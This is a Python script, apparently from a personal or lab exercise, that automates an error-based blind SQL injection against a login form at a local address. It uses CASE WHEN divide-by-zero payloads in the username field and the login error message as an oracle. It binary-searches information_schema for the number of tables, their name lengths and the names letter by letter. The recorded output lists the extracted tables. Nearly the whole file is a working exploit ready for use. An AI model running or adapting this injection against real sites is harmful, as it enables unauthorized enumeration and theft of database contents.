""" SQL Injection """
from time import sleep
import requests


def send_post_request(url, insert_data):
    """Send POST request"""
    try:
        page_response = requests.post(url=url, data=insert_data)
    except requests.exceptions.ConnectionError:
        print("Connection refused, request is putting in sleep and trying again...")
        sleep(10)
        page_response = requests.post(url=url, data=insert_data)
    return page_response


def find_number_of_tables(url, min_val, max_val):
    """Binary search for number of the tables using SELECT CASE"""
    mid_val = (max_val + min_val) // 2

    # Esitse
    insert_data = {
        "username": "admin' AND (SELECT CASE WHEN (SELECT COUNT(TABLE_NAME) FROM information_schema.tables)="
        + str(mid_val)
        + " THEN 1/0 ELSE 1 END)=1; -- ",
        "password": "b",
    }
    page_response = send_post_request(url, insert_data)
    if "Giris bilgileri hatali!" in page_response.text:
        return mid_val
    # Kucukse
    insert_data = {
        "username": "admin' AND (SELECT CASE WHEN (SELECT COUNT(TABLE_NAME) FROM information_schema.tables)<"
        + str(mid_val)
        + " THEN 1/0 ELSE 1 END)=1; -- ",
        "password": "b",
    }
    page_response = send_post_request(url, insert_data)
    if "Giris bilgileri hatali!" in page_response.text:
        return find_number_of_tables(url, min_val, mid_val - 1)
    # Buyukse
    return find_number_of_tables(url, mid_val + 1, max_val)


def find_length_of_table_name(url, table_index, min_val, max_val):
    """Binary search for the length of the table names using SELECT CASE"""
    mid_val = (max_val + min_val) // 2

    # Esitse
    insert_data = {
        "username": "admin' AND (SELECT CASE WHEN (SELECT LENGTH(TABLE_NAME) FROM information_schema.tables LIMIT "
        + str(table_index)
        + ", 1)="
        + str(mid_val)
        + " THEN 1/0 ELSE 'a' END)='a'; -- ",
        "password": "b",
    }
    page_response = send_post_request(url, insert_data)
    if "Giris bilgileri hatali!" in page_response.text:
        return mid_val
    # Kucukse
    insert_data = {
        "username": "admin' AND (SELECT CASE WHEN (SELECT LENGTH(TABLE_NAME) FROM information_schema.tables LIMIT "
        + str(table_index)
        + ", 1)<"
        + str(mid_val)
        + " THEN 1/0 ELSE 'a' END)='a'; -- ",
        "password": "b",
    }
    page_response = send_post_request(url, insert_data)
    if "Giris bilgileri hatali!" in page_response.text:
        return find_length_of_table_name(url, table_index, min_val, mid_val - 1)
    # buyukse
    return find_length_of_table_name(url, table_index, mid_val + 1, max_val)


def find_name_of_table(url, table_index, payload_list, char_position):
    """Binary search for name of the tables"""

    # A B C D E F G H I J K L M
    # len = 13, target = E min = 0 max = 12
    # mid_val = 6 lst[6] = G
    # lst[:mid_val] lst[:6] = A B C D E F len = 6 min = 0 max = 5
    # mid_val = 3 lst[3] = D
    # lst[mid_val + 1:] lst[4:] = E F len = 2 min = 0 max = 1
    # mid_val = 1 lst[1] = F len = 1
    # lst[:mid_val] lst[:1] = E len = 1 min = 0 max = 0
    # A B C D E F G H I J K L M N len = 14

    min_val = 0
    max_val = len(payload_list) - 1
    mid_val = (min_val + max_val) // 2

    while min_val <= max_val:
        # Esitse
        insert_data = {
            "username": "admin' AND (SELECT CASE WHEN (SELECT SUBSTRING(TABLE_NAME, "
            + str(char_position)
            + ", 1) FROM information_schema.tables LIMIT "
            + str(table_index)
            + ", 1)='"
            + payload_list[mid_val]
            + "' THEN 1/0 ELSE 'a' END)='a'; -- ",
            "password": "b",
        }
        page_response = send_post_request(url, insert_data)
        if "Giris bilgileri hatali!" in page_response.text:
            return payload_list[mid_val]
        # Kucukse
        insert_data = {
            "username": "admin' AND (SELECT CASE WHEN (SELECT SUBSTRING(TABLE_NAME, "
            + str(char_position)
            + ", 1) FROM information_schema.tables LIMIT "
            + str(table_index)
            + ", 1)<'"
            + payload_list[mid_val]
            + "' THEN 1/0 ELSE 'a' END)='a'; -- ",
            "password": "b",
        }
        page_response = send_post_request(url, insert_data)
        if "Giris bilgileri hatali!" in page_response.text:
            return find_name_of_table(
                url, table_index, payload_list[:mid_val], char_position
            )
        # Buyukse
        return find_name_of_table(
            url, table_index, payload_list[mid_val + 1 :], char_position
        )


URL = "http://127.0.0.1/hello/login.php"

# verdigimiz case dogru oldugunda "giris bilgileriniz hatali" diyecek

# Kac tablo oldugunu bul
number_of_tables = find_number_of_tables(URL, 0, 1000)
print("Number of tables found: " + str(number_of_tables))

# Tablo isimlerini bul
table_names = []

# 3. rowu getirmek icin LIMIT 2, 1 diyebilirsin. (n. row icin LIMIT n-1, 1)

for i in range(0, number_of_tables):  # Sira ile tablolari dene
    # index olarak ilerlerken tablonun isminin uzunlugunu bul
    table_name_length = find_length_of_table_name(
        url=URL, table_index=i, min_val=0, max_val=1000
    )

    # tablonun ismini bul
    table_name = []
    lst = list("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_")

    # tablo ismini tek tek harfleri donguye sokarak bul
    for j in range(1, table_name_length + 1):
        table_name.append(
            find_name_of_table(
                url=URL, table_index=i, payload_list=lst, char_position=j
            )
        )

    table_names.append("".join(table_name))
    print("".join(table_name))

print("All Found.")
print(table_names)

# Output
# ['ALL_PLUGINS', 'APPLICABLE_ROLES', 'CHARACTER_SETS', 'CHECK_CONSTRAINTS', 'COLLATIONS', 'COLLATION_CHARACTER_SET_APPLICABILITY', 'COLUMNS', 'COLUMN_PRIVILEGES', 'ENABLED_ROLES', 'ENGINES', 'EVENTS', 'FILES', 'GLOBAL_STATUS', 'GLOBAL_VARIABLES', 'KEYWORDS', 'KEY_CACHES', 'KEY_COLUMN_USAGE', 'OPTIMIZER_TRACE', 'PARAMETERS', 'PARTITIONS', 'PLUGINS', 'PROCESSLIST', 'PROFILING', 'REFERENTIAL_CONSTRAINTS', 'ROUTINES', 'SCHEMATA', 'SCHEMA_PRIVILEGES', 'SESSION_STATUS', 'SESSION_VARIABLES', 'STATISTICS', 'SQL_FUNCTIONS', 'SYSTEM_VARIABLES', 'TABLES', 'TABLESPACES', 'TABLE_CONSTRAINTS', 'TABLE_PRIVILEGES', 'TRIGGERS', 'USER_PRIVILEGES', 'VIEWS', 'GEOMETRY_COLUMNS', 'SPATIAL_REF_SYS', 'CLIENT_STATISTICS', 'INDEX_STATISTICS', 'INNODB_SYS_DATAFILES', 'USER_STATISTICS', 'INNODB_SYS_TABLESTATS', 'INNODB_LOCKS', 'INNODB_MUTEXES', 'INNODB_CMPMEM', 'INNODB_CMP_PER_INDEX', 'INNODB_CMP', 'INNODB_FT_DELETED', 'INNODB_CMP_RESET', 'INNODB_LOCK_WAITS', 'TABLE_STATISTICS', 'INNODB_TABLESPACES_ENCRYPTION', 'INNODB_BUFFER_PAGE_LRU', 'INNODB_SYS_FIELDS', 'INNODB_CMPMEM_RESET', 'INNODB_SYS_COLUMNS', 'INNODB_FT_INDEX_TABLE', 'INNODB_CMP_PER_INDEX_RESET', 'USER_VARIABLES', 'INNODB_FT_INDEX_CACHE', 'INNODB_SYS_FOREIGN_COLS', 'INNODB_FT_BEING_DELETED', 'INNODB_BUFFER_POOL_STATS', 'INNODB_TRX', 'INNODB_SYS_FOREIGN', 'INNODB_SYS_TABLES', 'INNODB_FT_DEFAULT_STOPWORD', 'INNODB_FT_CONFIG', 'INNODB_BUFFER_PAGE', 'INNODB_SYS_TABLESPACES', 'INNODB_METRICS', 'INNODB_SYS_INDEXES', 'INNODB_SYS_VIRTUAL', 'INNODB_TABLESPACES_SCRUBBING', 'INNODB_SYS_SEMAPHORE_WAITS', 'CHARACTERS', 'COMMENTS', 'USERS', 'COLUMNS_PRIV', 'COLUMN_STATS', 'DB', 'EVENT', 'FUNC', 'GENERAL_LOG', 'GLOBAL_PRIV', 'GTID_SLAVE_POS', 'HELP_CATEGORY', 'HELP_KEYWORD', 'HELP_RELATION', 'HELP_TOPIC', 'INDEX_STATS', 'INNODB_INDEX_STATS', 'INNODB_TABLE_STATS', 'PLUGIN', 'PROC', 'PROCS_PRIV', 'PROXIES_PRIV', 'ROLES_MAPPING', 'SERVERS', 'SLOW_LOG', 'TABLES_PRIV', 'TABLE_STATS', 'TIME_ZONE', 'TIME_ZONE_LEAP_SECOND', 'TIME_ZONE_NAME', 'TIME_ZONE_TRANSITION', 'TIME_ZONE_TRANSITION_TYPE', 'TRANSACTION_REGISTRY', 'USER', 'COND_INSTANCES', 'EVENTS_WAITS_CURRENT', 'EVENTS_WAITS_HISTORY', 'EVENTS_WAITS_HISTORY_LONG', 'EVENTS_WAITS_SUMMARY_BY_HOST_BY_EVENT_NAME', 'EVENTS_WAITS_SUMMARY_BY_INSTANCE', 'EVENTS_WAITS_SUMMARY_BY_THREAD_BY_EVENT_NAME', 'EVENTS_WAITS_SUMMARY_BY_USER_BY_EVENT_NAME', 'EVENTS_WAITS_SUMMARY_BY_ACCOUNT_BY_EVENT_NAME', 'EVENTS_WAITS_SUMMARY_GLOBAL_BY_EVENT_NAME', 'FILE_INSTANCES', 'FILE_SUMMARY_BY_EVENT_NAME', 'FILE_SUMMARY_BY_INSTANCE', 'HOST_CACHE', 'MUTEX_INSTANCES', 'OBJECTS_SUMMARY_GLOBAL_BY_TYPE', 'PERFORMANCE_TIMERS', 'RWLOCK_INSTANCES', 'SETUP_ACTORS', 'SETUP_CONSUMERS', 'SETUP_INSTRUMENTS', 'SETUP_OBJECTS', 'SETUP_TIMERS', 'TABLE_IO_WAITS_SUMMARY_BY_INDEX_USAGE', 'TABLE_IO_WAITS_SUMMARY_BY_TABLE', 'TABLE_LOCK_WAITS_SUMMARY_BY_TABLE', 'THREADS', 'EVENTS_STAGES_CURRENT', 'EVENTS_STAGES_HISTORY', 'EVENTS_STAGES_HISTORY_LONG', 'EVENTS_STAGES_SUMMARY_BY_THREAD_BY_EVENT_NAME', 'EVENTS_STAGES_SUMMARY_BY_ACCOUNT_BY_EVENT_NAME', 'EVENTS_STAGES_SUMMARY_BY_USER_BY_EVENT_NAME', 'EVENTS_STAGES_SUMMARY_BY_HOST_BY_EVENT_NAME', 'EVENTS_STAGES_SUMMARY_GLOBAL_BY_EVENT_NAME', 'EVENTS_STATEMENTS_CURRENT', 'EVENTS_STATEMENTS_HISTORY', 'EVENTS_STATEMENTS_HISTORY_LONG', 'EVENTS_STATEMENTS_SUMMARY_BY_THREAD_BY_EVENT_NAME', 'EVENTS_STATEMENTS_SUMMARY_BY_ACCOUNT_BY_EVENT_NAME', 'EVENTS_STATEMENTS_SUMMARY_BY_USER_BY_EVENT_NAME', 'EVENTS_STATEMENTS_SUMMARY_BY_HOST_BY_EVENT_NAME', 'EVENTS_STATEMENTS_SUMMARY_GLOBAL_BY_EVENT_NAME', 'EVENTS_STATEMENTS_SUMMARY_BY_DIGEST', 'USERS', 'ACCOUNTS', 'HOSTS', 'SOCKET_INSTANCES', 'SOCKET_SUMMARY_BY_INSTANCE', 'SOCKET_SUMMARY_BY_EVENT_NAME', 'SESSION_CONNECT_ATTRS', 'SESSION_ACCOUNT_CONNECT_ATTRS', 'PMA__BOOKMARK', 'PMA__CENTRAL_COLUMNS', 'PMA__COLUMN_INFO', 'PMA__DESIGNER_SETTINGS', 'PMA__EXPORT_TEMPLATES', 'PMA__FAVORITE', 'PMA__HISTORY', 'PMA__NAVIGATIONHIDING', 'PMA__PDF_PAGES', 'PMA__RECENT', 'PMA__RELATION', 'PMA__SAVEDSEARCHES', 'PMA__TABLE_COORDS', 'PMA__TABLE_INFO', 'PMA__TABLE_UIPREFS', 'PMA__TRACKING', 'PMA__USERCONFIG', 'PMA__USERGROUPS', 'PMA__USERS']
